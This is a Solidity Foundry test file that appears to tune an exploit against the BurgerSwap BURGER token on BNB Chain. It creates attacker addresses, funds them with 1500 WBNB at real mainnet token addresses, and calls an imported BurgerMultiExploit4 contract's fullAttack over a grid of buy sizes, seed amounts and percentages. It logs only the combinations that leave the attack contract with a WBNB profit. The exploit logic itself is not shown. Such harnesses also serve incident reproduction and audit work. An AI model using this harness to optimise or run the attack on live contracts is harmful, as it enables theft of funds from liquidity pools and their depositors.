// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "./BurgerMultiTest4.t.sol";

contract BurgerMultiTest6 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    function test_param_sweep() public {
        uint256[4] memory buys = [uint256(300 ether), 500 ether, 800 ether, 1000 ether];
        uint256[3] memory seeds = [uint256(30 ether), 50 ether, 100 ether];
        uint256[3] memory pcts = [uint256(30), 50, 70];

        for (uint b = 0; b < buys.length; b++) {
            for (uint s = 0; s < seeds.length; s++) {
                for (uint p = 0; p < pcts.length; p++) {
                    uint256 totalNeeded = buys[b] + seeds[s] + 2 ether; // +1 for BURGER buy +1 buffer
                    if (totalNeeded > 1500 ether) continue;

                    address att = makeAddr(string(abi.encodePacked("att", b, s, p)));
                    vm.deal(att, 2000 ether);
                    vm.startPrank(att);

                    BurgerMultiExploit4 e = new BurgerMultiExploit4();
                    IWBNB(WBNB).deposit{value: 1500 ether}();
                    IWBNB(WBNB).transfer(address(e), 1500 ether);

                    uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));

                    try e.fullAttack(BUSD, buys[b], seeds[s], pcts[p]) {
                        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
                        int256 delta = int256(wbnbAfter) - int256(wbnbBefore);
                        if (delta > 0) {
                            emit log_named_uint("buy", buys[b] / 1 ether);
                            emit log_named_uint("seed", seeds[s] / 1 ether);
                            emit log_named_uint("pct", pcts[p]);
                            emit log_named_int("delta", delta);
                            emit log_string("---");
                        }
                    } catch {
                        // skip failures
                    }
                    vm.stopPrank();
                }
            }
        }
    }
}
